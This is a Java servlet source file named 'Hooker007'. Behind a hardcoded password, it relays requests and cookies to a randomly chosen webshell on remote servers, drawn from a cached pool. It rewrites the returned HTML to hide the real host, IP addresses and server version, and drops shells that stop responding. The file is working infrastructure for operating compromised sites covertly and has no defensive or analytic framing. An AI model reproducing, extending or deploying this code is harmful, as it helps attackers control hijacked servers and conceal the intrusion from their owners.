package com.blog.web.servlet;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URLEncoder;
import java.util.Collections;
import java.util.Enumeration;
import java.util.List;
import java.util.Map;

import javax.servlet.ServletException;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import com.blog.web.cache.ShellCache;
import com.blog.web.entity.HttpEntity;
import com.blog.web.model.Shell;
import com.blog.web.util.RequestUtil;
import com.blog.web.util.SpringContextHelper;
import com.blog.web.util.StringUtils;

public class Hooker007 extends HttpServlet {
	public void doGet(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {
		doPost(request, response);
	}

	public void doPost(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {
		response.setContentType("text/html");
		try {
			request.setCharacterEncoding("GBK");
			response.setCharacterEncoding("GBK");
			PrintWriter out = response.getWriter();
			loadCurrIp(request);
			String action = request.getParameter("action");
			if("login".equals(action)){
				if(!checkLogin(request)){
					out.print("{'code':1}");
					return;
				}
				out.print("{'code':0}");
				return;
			}
			if(!checkLogin(request)){
				request.getRequestDispatcher("/WEB-INF/jsp/shell.jsp")
				.forward(request, response);
				return;
			}
			String html = doShell(request, response);
			out.write(html);
		} catch (Exception e) {

		}
	}
	private void addCookie(HttpServletResponse response,Map<String, String> cookieMap){
		if(StringUtils.isNullOrEmpty(cookieMap)){
			return;
		}
		for (String str:cookieMap.keySet()) {
			if(str.equalsIgnoreCase("JSESSIONID")||str.equalsIgnoreCase("ESPSESSION")){
				continue;
			}
			response.addCookie(new Cookie(str, cookieMap.get(str)));
		}
	}
	private boolean checkLogin(HttpServletRequest request){
		System.out.println("SessionId:"+request.getSession().getId());
		Integer isLogin=(Integer) request.getSession().getAttribute("webShellIsLogin");
		if(isLogin!=null){
			return true;
		}
		String password = request.getParameter("pass");
		if(password!=null){
			password=password.trim();
		}
		if("hooker007".equals(password)){
			request.getSession().setAttribute("webShellIsLogin", 1);
			return true;
		}
		return false;
	}
	private void loadCurrIp(HttpServletRequest request){
		ShellCache shellCache = (ShellCache) SpringContextHelper
				.getBean("shellCache");
		System.out.println("当前域名："+request.getAttribute("basePath"));
		String ip = shellCache.getShellIp(String.valueOf(request.getAttribute("basePath")));
		request.setAttribute("currIp", ip);
	}
	public String doShell(HttpServletRequest request,
			HttpServletResponse response) {
		Shell shell = getAShell(request);
		if (StringUtils.isNullOrEmpty(shell)) {
			return null;
		}
		String postData = getPostData(request);
		String html = getShellHtml(request,response, shell, postData);
		return html;
	}

	private String getShellHtml(HttpServletRequest request,HttpServletResponse response, Shell shell,
			String postData) {
		ShellCache shellCache = (ShellCache) SpringContextHelper
				.getBean("shellCache");
		String cookie=RequestUtil.getRequestCookies(request);
		HttpEntity entity = shellCache.getShellHtml(shell.getUrl(), postData,cookie);
		if (StringUtils.isNullOrEmpty(entity)) {
			shell.setErrNum(shell.getErrNum()+1);
			if(shell.getErrNum()>3){
				shellCache.delShell(shell);
				return "<h1 align='center'>访问超时，请刷新后继续浏览！</h1>";
			}
			shellCache.updateShell(shell);
			return "<h1 align='center'>访问超时，请刷新后继续浏览！</h1>";
		}
		if(shell.getErrNum()>0){
			shell.setErrNum(0);
			shellCache.updateShell(shell);
		}
		String html=entity.getHtml();
		if (StringUtils.isNullOrEmpty(html)) {
			shellCache.delShell(shell);
			return "<h1 align='center'>访问超时，请刷新后继续浏览！</h1>";
		}
		addCookie(response, entity.getCookieMap());
		String ip = shellCache.getShellIp(String.valueOf(request.getAttribute("basePath")));
		if (ip != null) {
			html = html.replaceAll("\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}",
					ip);
			html = html.replaceAll("IIS/[0-9].[0-9]", "IIS/9.0");
		}
		String path = getRequestPath(request);
		String shellPath = getUrlPath(shell.getUrl());
		String host = getUrlHost(shell.getUrl());
		html = html.replace(shellPath, path).replace(host, path);
		String tmptxt = "<img src=\""
				+ StringUtils.textCutCenter(html, "PR:<img src=\"", "\"")
				+ "\">";
		html = html.replace(tmptxt,
				"<script language=\"javascript\" src=\"http://pr.links.cn/getpr.asp?queryurl="
						+ request.getServerName() + "\"></script>");
		return html;
	}

	public String getUrlHost(String url) {
		try {
			URI uri = new URI(url);
			return uri.getHost();
		} catch (URISyntaxException e) {
			e.printStackTrace();
		}
		return null;
	}

	public String getUrlPath(String url) {
		try {
			URI uri = new URI(url);
			return uri.getPath();
		} catch (URISyntaxException e) {
			e.printStackTrace();
		}
		return null;
	}

	public String getPostData(HttpServletRequest request) {
		Enumeration e = (Enumeration) request.getParameterNames();
		if (StringUtils.isNullOrEmpty(e)) {
			return "";
		}
		StringBuffer sbData = new StringBuffer("");
		while (e.hasMoreElements()) {
			try {
				String parName = (String) e.nextElement();
				String value = request.getParameter(parName);
				if (StringUtils.isNullOrEmpty(value)) {
					continue;
				}
				value = URLEncoder.encode(value, "GBK");
				sbData.append(parName);
				sbData.append("=");
				sbData.append(value);
				sbData.append("&");
			} catch (Exception e2) {
			}
		}
		return sbData.toString();
	}

	public String getRequestPath(HttpServletRequest request) {
		String path = request.getRequestURI();
		path = path.replace(request.getContextPath(), "");
		path = path.replace("/", "");
		String localPath = request.getScheme() + "://"
				+ request.getServerName() + ":" + request.getServerPort()
				+ request.getContextPath() + "/" + path;
		return localPath;
	}

	public Shell getAShell(HttpServletRequest request) {
		// 获得一个
		Shell shell = (Shell) request.getSession().getAttribute("currShell");
		if (!StringUtils.isNullOrEmpty(shell)) {
			return shell;
		}
		ShellCache shellCache = (ShellCache) SpringContextHelper
				.getBean("shellCache");
		List<Shell> shells = shellCache.loadShells();
		if (StringUtils.isNullOrEmpty(shells)) {
			return null;
		}
		Collections.shuffle(shells);
		shell = shells.get(0);
		return shell;
	}

	public void init() throws ServletException {
		// Put your code here
	}

	public static void main(String[] args) throws URISyntaxException {
		System.out.println(3345*2356);
	}
}
